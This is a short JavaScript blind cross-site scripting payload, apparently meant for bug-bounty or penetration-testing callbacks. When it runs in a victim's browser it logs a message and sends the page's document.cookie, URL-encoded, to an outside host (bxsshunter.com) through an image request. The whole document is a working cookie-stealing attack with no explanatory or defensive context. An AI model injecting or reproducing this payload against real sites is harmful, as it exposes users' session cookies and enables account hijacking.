(() => {
  console.log("🔥 BXSS Payload Executed!");
  new Image().src = "https://bxsshunter.com/ping?id=" + encodeURIComponent(document.cookie);
})();
